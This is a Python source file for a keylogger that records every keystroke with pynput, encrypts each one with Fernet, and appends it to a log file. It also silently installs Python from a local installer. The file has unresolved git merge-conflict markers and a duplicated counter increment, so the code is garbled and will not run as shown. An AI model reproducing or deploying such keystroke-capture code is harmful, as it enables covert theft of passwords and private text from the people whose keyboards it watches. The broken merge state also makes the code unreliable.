import subprocess
import os
from pynput import keyboard
from cryptography.fernet import Fernet

def install_python():
    if not os.path.exists("C:\\Python311\\python.exe"):
        python_installer = "python-3.11.9-amd64.exe"
        if os.path.exists(python_installer):
            subprocess.run([python_installer, '/quiet', '/norestart'], check=True)
        else:
            print("Python installer not found.")
            raise FileNotFoundError("Python installer not found.")
    else:
        print("Python is already installed.")

def get_encryption_key():
    try:
        with open('ekey.txt', 'r') as key_file:
            key = key_file.read().strip()
        return key.encode()
    except FileNotFoundError:
        raise ValueError("Encryption key file not found.")
    except Exception as e:
        raise ValueError(f"Error reading encryption key: {str(e)}")

key_count = 0

def keyPressed(key):
    global key_count
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    try:
<<<<<<< HEAD
        with open("keyfile.txt", 'ab') as logKey:
=======
        with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
            if key_count >= 50:
                logKey.write(cipher_suite.encrypt(b'\n'))  # New line every 50 inputs to keep clean
                key_count = 0
>>>>>>> parent of 332cb8d (working decryption)
            try:
                char = key.char
                logKey.write(cipher_suite.encrypt(char.encode()))
            except AttributeError:
<<<<<<< HEAD
                if key == keyboard.Key.space:
                    logKey.write(cipher_suite.encrypt(b' '))
=======
                # Handle special keys
                if key == keyboard.Key.space:
                    logKey.write(cipher_suite.encrypt(b' '))  # When Space is pressed write ' ' instead of key.space
>>>>>>> parent of 332cb8d (working decryption)
                else:
                    logKey.write(cipher_suite.encrypt(f'[{key}]'.encode()))
    except Exception as e:
        print(f"Error logging key: {str(e)}")

    key_count += 1

    key_count += 1  

    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    install_python()

    # Ensure the keyfile.txt is empty at the start
    with open("keyfile.txt", 'wb') as f:
        pass

    
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
<<<<<<< HEAD
    listener.join()
=======
    listener.join()  
    input()  
>>>>>>> parent of 332cb8d (working decryption)
